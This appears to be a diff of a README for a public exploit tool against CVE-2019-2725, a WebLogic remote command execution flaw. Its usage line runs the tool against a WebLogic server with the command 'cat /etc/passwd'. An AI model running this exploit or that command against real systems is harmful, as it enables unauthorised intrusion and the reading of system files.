@@ -9,7 +9,7 @@ CVE-2019-2725 Weblogic _async远程命令执行回显版exp
 
 ## Usage
 
->cve2019-2725_weblogic_rce.exe http://192.168.31.5:7001  "cat /etc/passwd"
+>cve2019-2725_weblogic_rce.exe http://192.168.31.5:7001 &nbsp; "cat /etc/passwd"
 
 ![cve2019-2725](https://raw.githubusercontent.com/FlyfishSec/weblogic_rce/master/Usage.gif "Weblogic _async远程命令执行回显版exp")  
 
